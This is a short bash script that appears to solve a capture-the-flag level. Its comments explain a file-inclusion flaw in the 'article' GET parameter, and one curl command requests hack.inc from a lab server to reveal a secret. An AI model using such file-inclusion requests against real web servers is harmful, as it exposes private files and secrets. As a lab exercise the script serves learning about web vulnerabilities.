#! /usr/bin/env bash

# From the comments on index.html, it is possible to conclude that the server includes files whose names are
# passed as value of GET parameter 'article'. From the hint, one should include hack.inc to get the secret.
# By appending this name to the query string, the secret is retrieved.
curl http://10.0.23.24:8002/level04/index.php?article=hack.inc